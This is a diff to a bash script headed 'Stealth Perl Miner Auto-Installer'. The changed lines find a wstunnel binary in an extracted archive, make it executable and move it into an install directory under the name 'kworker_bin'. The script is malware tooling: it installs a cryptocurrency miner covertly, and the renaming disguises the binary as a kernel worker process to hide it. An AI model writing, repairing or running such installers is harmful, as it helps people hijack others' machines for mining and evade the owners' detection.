@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ==========================================
-# Stealth Perl Miner Auto-Installer (Robust)
+# Stealth Perl Miner Auto-Installer (Final Fix)
 # ==========================================
 
 set -e # Exit on error
@@ -46,29 +46,19 @@ if [ ! -f "kworker_bin" ]; then
     # Extract everything
     tar -xzf ${EXTRACT_DIR}/wstunnel.tar.gz -C ${EXTRACT_DIR}
     
-    # Debug: Show what was extracted
-    echo -e "${YELLOW}[*] Extracted files:${NC}"
-    find ${EXTRACT_DIR} -type f | head -n 10
-
-    # Find the binary (handles nested folders like wstunnel-10.5.2-linux-amd64/wstunnel)
-    BINARY_PATH=$(find ${EXTRACT_DIR} -type f -name "wstunnel*" -executable 2>/dev/null | head -n 1)
-    
-    # If not found by name, look for any executable file in the first folder
-    if [ -z "$BINARY_PATH" ]; then
-        # Find the first folder, then find an executable in it
-        FIRST_FOLDER=$(find ${EXTRACT_DIR} -type d -not -path "${EXTRACT_DIR}" | head -n 1)
-        if [ -n "$FIRST_FOLDER" ]; then
-            BINARY_PATH=$(find ${FIRST_FOLDER} -type f -executable | head -n 1)
-        fi
-    fi
+    # Find the binary by name (wstunnel)
+    BINARY_PATH=$(find ${EXTRACT_DIR} -type f -name "wstunnel" | head -n 1)
     
     if [ -z "$BINARY_PATH" ]; then
-        echo -e "${RED}[!] Error: Could not find wstunnel binary. Archive structure:${NC}"
+        echo -e "${RED}[!] Error: Could not find 'wstunnel' file in archive.${NC}"
         ls -R ${EXTRACT_DIR}
         exit 1
     fi
     
     echo -e "${GREEN}[+] Found binary at: ${BINARY_PATH}${NC}"
+    
+    # Force executable permission
+    chmod +x "$BINARY_PATH"
     
     # Move to install dir and rename
     mv "$BINARY_PATH" ${INSTALL_DIR}/kworker_bin
